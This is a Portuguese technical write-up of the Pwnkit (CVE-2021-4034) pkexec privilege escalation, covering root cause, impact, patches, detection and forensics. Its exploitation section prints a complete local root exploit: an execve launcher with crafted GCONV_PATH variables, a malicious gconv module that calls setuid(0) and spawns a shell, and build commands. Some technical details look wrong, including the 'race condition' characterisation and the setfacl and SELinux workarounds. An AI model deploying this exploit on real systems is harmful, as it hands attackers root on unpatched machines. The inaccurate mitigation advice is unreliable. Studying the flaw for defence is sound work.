<!-- ===================================== -->
<!--   Pwnkit — Polkit Privilege Escalation -->
<!-- ===================================== -->

<p align="center">
  <img src="https://img.shields.io/badge/CVE-2021--4034-critical?style=for-the-badge">
  <img src="https://img.shields.io/badge/Impact-Privilege%20Escalation-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/Layer-Linux%20Userland-black?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Exploitability-Low%20Complexity-orange?style=flat-square">
  <img src="https://img.shields.io/badge/Access-Local-blue?style=flat-square">
  <img src="https://img.shields.io/badge/Offense-Red%20Team-black?style=flat-square">
  <img src="https://img.shields.io/badge/Defense-Patching%20%26%20Hardening-informational?style=flat-square">
</p>

---

# 🔓 Pwnkit — CVE-2021-4034  
## Análise Técnica e Exploração de Escalonamento de Privilégios no `pkexec` (Polkit)

> Este documento apresenta uma **análise técnica aprofundada da vulnerabilidade Pwnkit (CVE-2021-4034)**, uma falha crítica de **escalonamento de privilégios local (LPE)** presente no utilitário `pkexec`, componente do **Polkit (PolicyKit)** amplamente distribuído em sistemas Linux modernos.
>
> A vulnerabilidade permite que um **usuário não privilegiado obtenha acesso root** através da manipulação de argumentos e variáveis de ambiente, explorando uma condição de **acesso fora dos limites (out-of-bounds)** durante o processamento inicial da função `main()` do binário SUID.
>
> Além da análise conceitual da falha, este material aborda **exploração prática em laboratório**, dissecação do **código-fonte vulnerável**, compreensão do **layout de memória de processos POSIX**, impacto real em ambientes corporativos e **estratégias eficazes de mitigação e detecção**.

---

## 🎯 Objetivos do Documento

- Compreender o **funcionamento interno do Polkit e do pkexec**
- Identificar a **causa raiz da vulnerabilidade no código-fonte**
- Explicar o papel do **layout de memória argv/envp** na exploração
- Demonstrar **vetores reais de ataque utilizados na prática**
- Analisar **impacto em sistemas Linux de produção**
- Aplicar **metodologia ofensiva com visão defensiva**
- Consolidar conhecimento em **Linux Privilege Escalation (Userland)**

---

## 📌 Metadados Técnicos

- **CVE:** CVE-2021-4034 (Pwnkit)
- **Categoria:** Local Privilege Escalation · Linux Userland
- **Componente afetado:** `pkexec` (Polkit)
- **Tipo:** Elevação de privilégios local
- **Acesso inicial:** Usuário não privilegiado
- **Impacto final:** Execução de código como `root`
- **Ambiente:** Distribuições Linux com Polkit instalado
- **Metodologia:** Análise → Exploração → Impacto → Mitigação

---

## 🏷️ Tags

`#Pwnkit` `#CVE2021_4034` `#Polkit` `#pkexec`  
`#LinuxSecurity` `#PrivilegeEscalation` `#UserlandExploit`  
`#RedTeam` `#OffensiveSecurity` `#AppSec`

---

## ⚠️ Aviso Legal

> Este material é destinado **exclusivamente para fins educacionais**, pesquisa de segurança e **laboratórios controlados**.  
> A exploração de vulnerabilidades em sistemas sem autorização explícita é **ilegal** e pode resultar em penalidades civis e criminais.

---

# Análise Técnica: Pwnkit (CVE-2021-4034) - Vulnerabilidade de Escalonamento de Privilégios no pkexec do Polkit

## Introdução

A vulnerabilidade CVE-2021-4034, denominada **Pwnkit**, constitui uma falha crítica de escalonamento de privilégios local (Local Privilege Escalation - LPE) no componente **pkexec** do Policy Toolkit (Polkit), presente em todas as versões do pacote desde sua implementação inicial (commit inicial `c8c3d83` de 2009). Esta vulnerabilidade permite que um usuário não privilegiado obtenha privilégios de superusuário (root) através da exploração de uma condição de **out-of-bounds write** na manipulação de argumentos da linha de comando.

![pwnkit](https://blogger.googleusercontent.com/img/a/AVvXsEhI97Ku4vg4Jm_CGDvqtOuK_CPe3ndwAvsWS1laMg7it8hFSVmooGbTIBB-VyzaXv2X-jJ9DJKmHvzWRfu5IHYSqrmxP3PRqh1et84PzAFwrVjrmoJI9gmzgwDInqw1mm_idVrZpVFtMBLpwXlE4ZlWnmOhvXoPsp7JbnyYqziUoHjqiTv6Yrl6lcUH)

----
## Contexto Técnico

### Arquitetura do Polkit

O Polkit (PolicyKit) é um framework de autorização para sistemas Unix-like que permite a processos não privilegiados comunicarem-se com processos privilegiados. Atua como uma camada de abstração entre o chamador da ação e o mecanismo de autorização, proporcionando controle granular sobre políticas de segurança.

O componente `pkexec` é um setuid binary (`-rwsr-xr-x 1 root root`) que implementa a interface de execução privilegiada, funcionando como análogo ao `sudo` para ambientes que utilizam D-Bus. Sua função primária é executar comandos com elevação de privilégios após validação de política.

### Especificação da Vulnerabilidade

A vulnerabilidade reside na função `main()` do código-fonte do `pkexec` (arquivo `src/programs/pkexec.c`). O defeito ocorre durante o processamento inicial de argumentos:

```c
int main(int argc, char *argv[]) {
    /* ... */
    for (n = 1; n < (guint) argc; n++) {
        /* Processamento de argumentos */
    }
    /* ... */
}
```

Quando `pkexec` é invocado **sem argumentos** (`argc = 1`), o loop não é executado, mantendo `n = 1`. Posteriormente, ao acessar `argv[n]` para construção do caminho do programa, o código referencia memória além dos limites do array `argv`.

### Mecanismo de Exploração

A exploração aproveita-se da representação interna de argumentos e variáveis de ambiente em processos POSIX. No kernel Linux, os arrays `argv` e `envp` são contíguos na memória do processo. A leitura de `argv[1]` quando `argc = 1` resulta no acesso ao primeiro elemento de `envp`.

O exploit manipula esta condição através da chamada `execve()` com:

- `argv = {NULL}` (array vazio)
- `envp = {"VARIÁVEL_MALICIOSA=valor", NULL}`    

O código vulnerável realiza:

```c
path = g_strdup (argv[n]); /* n = 1, argv[1] aponta para envp[0] */
```

Subsequentemente, ao tentar validar o caminho:

```c
if (path[0] != '/') {
    /* Busca em PATH */
    s = g_find_program_in_path (path);
```

O atacante define `argv[1]` (via `envp[0]`) para um valor como `GCONV_PATH=./payload`. A função `g_find_program_in_path()` tenta localizar o programa `GCONV_PATH=./payload` nos diretórios listados na variável `PATH`, criando condições para injeção de código.

### Vectors de Exploração Primários

1. **Abuso de GCONV_PATH** (método mais comum):
    - Define `GCONV_PATH` para um diretório controlado pelo atacante
    - Injeta módulos de conversão de caracteres maliciosos (`gconv-modules`)        
    - Executa código arbitrário durante o carregamento do módulo GCONV

2. **Manipulação de CHARSET**:
    - Explora o carregamento de módulos de codificação via `CHARSET`        
    - Permite execução através da pilha de localização (locale)

3. **Outros vectors de ambiente**:
    
    - `LD_PRELOAD` (normalmente filtrado em binários SUID)
    - `LD_LIBRARY_PATH`
    - `PYTHONPATH` entre outros

---
## Metodologia de Exploração Detalhada

### PoC em C (Arthepsy Variant)

```c
/*
 * CVE-2021-4034 POC por arthepsy
 * Baseado na análise técnica da Qualys
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv) {
    char *envp[] = {
        "GCONV_PATH=.",
        "SHELL=doesnt_matter",
        "CHARSET=PWNKIT",
        "PATH=GCONV_PATH=.",
        NULL
    };
    
    char *args[] = { NULL };
    
    /* Executa pkexec sem argumentos */
    execve("/usr/bin/pkexec", args, envp);
    
    return 0;
}
```

### Configuração do Ambiente de Exploração

Para o vector `GCONV_PATH`, o atacante deve criar:

1. **Estrutura de diretórios**:

```bash
mkdir -p GCONV_PATH=.
mkdir -p pwnkit
```

2. **Arquivo `gconv-modules`**:

```text
module  UTF-8//    PWNKIT//    pwnkit    2
```

3. **Módulo malicioso compartilhado** (`pwnkit.so`):

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}
void gconv_init() {
    setuid(0);
    setgid(0);
    system("/bin/sh");
}
```

### Compilação e Execução

```bash
gcc -fPIC -shared pwnkit.c -o pwnkit.so
gcc -o exploit exploit.c
./exploit
```

---
## Análise de Impacto

### Sistemas Afetados

- **Todas as distribuições Linux** com Polkit instalado (padrão na maioria)    
- **Versões do Polkit**: Todas desde a versão inicial até:
    - polkit-0.105-33.el7 (RHEL/CentOS 7)
    - polkit-0.117-1 (Arch Linux)
    - polkit-0.105-31 (Debian 11)
    - polkit-0.105-26 (Ubuntu 20.04 LTS)

### Fatores de Risco

- **CVSS v3.1 Score**: 7.8 (High) - `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
- **Pré-condições**: Acesso local (shell ou conta de usuário)
- **Complexidade de Exploração**: Baixa (exploit confiável e público)
- **Interação do Usuário**: Nenhuma requerida

---
## Mitigações e Correções

### Atualizações Oficiais

|Distribuição|Versão Corrigida|Comando de Atualização|
|---|---|---|
|RHEL/CentOS 7|polkit-0.105-33.el7|`yum update polkit`|
|Ubuntu 20.04+|polkit-0.105-26ubuntu1.3|`apt update && apt upgrade polkit`|
|Debian 11|polkit-0.105-31+deb11u1|`apt update && apt upgrade policykit-1`|
|Arch Linux|polkit-0.120-3|`pacman -Syu`|

### Workarounds Temporários

1. **Remoção do bit SUID** (mitigação imediata):

```bash
chmod 0755 /usr/bin/pkexec
# Verificação: ls -l /usr/bin/pkexec
```

2. **Controle de Acesso via PACL** (Linux ≥ 5.1):

```bash
setfacl -m u:root:r-x /usr/bin/pkexec
```

3. **SELinux/AppArmor**:

```bash
# Política SELinux personalizada
type_transition unconfined_t pkexec_exec_t : process no_transition;
```

### Detecção e Monitoramento

1. **Assinaturas de Log** (syslog/auditd):

```text
type=EXECVE msg=audit(1643155200.000:123): argc=1 a0="/usr/bin/pkexec"
type=SYSCALL msg=audit(1643155200.000:124): arch=c000003e syscall=59 success=no exit=-2
```

2. **Monitoramento de Processos**:

```bash
# Detecção via eBPF
sudo bpftrace -e 'tracepoint:syscalls:sys_enter_execve /comm == "pkexec"/ { printf("%s %s\n", comm, str(args->argv[0])); }'
```

3. **Verificação de Integridade**:

```bash
# Verificação do binário pkexec
rpm -V polkit
debsums -c /usr/bin/pkexec
```

---
## Análise Pós-Exploração

### Persistência e Lateral Movement

Exploradores avançados podem utilizar o Pwnkit como vetor inicial para:

1. **Injeção de backdoors** via módulos PAM
2. **Comprometimento de kernels** através de loadable modules
3. **Ataques a containers** via escape para host

### Forense Digital

Artefatos de exploração incluem:

- Entradas em `/var/log/auth.log` ou `/var/log/secure`
- Processos filhos de pkexec com UID 0
- Arquivos temporários em `/tmp/` ou `$HOME`
- Módulos GCONV em diretórios não padrão

## Referências Técnicas Adicionais

1. **Análise de Patch**:
    - [Commit de correção upstream](https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683)
    - Diferenças: Adição de validação `argc > 1` e manipulação segura de ponteiros

2. **Recursos de Pesquisa**:    
    - [Qualys Security Advisory](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)
    - [NVD Entry - CVE-2021-4034](https://nvd.nist.gov/vuln/detail/CVE-2021-4034)
    - [MITRE ATT&CK - T1068](https://attack.mitre.org/techniques/T1068/)

3. **Ferramentas de Detecção**:    
    - [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
    - [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
    - [chkrootkit](http://www.chkrootkit.org/)

---
## Conclusão

A CVE-2021-4034 representa uma falha fundamental na manipulação de memória do Polkit, explorável através de condições de corrida de memória específicas. Sua ubiquidade e facilidade de exploração a tornam um vetor significativo para ataques de escalonamento de privilégios em ambientes Linux. A mitigação completa requer aplicação imediata de patches ou implementação de controles de segurança compensatórios, acompanhados por monitoramento proativo de tentativas de exploração.
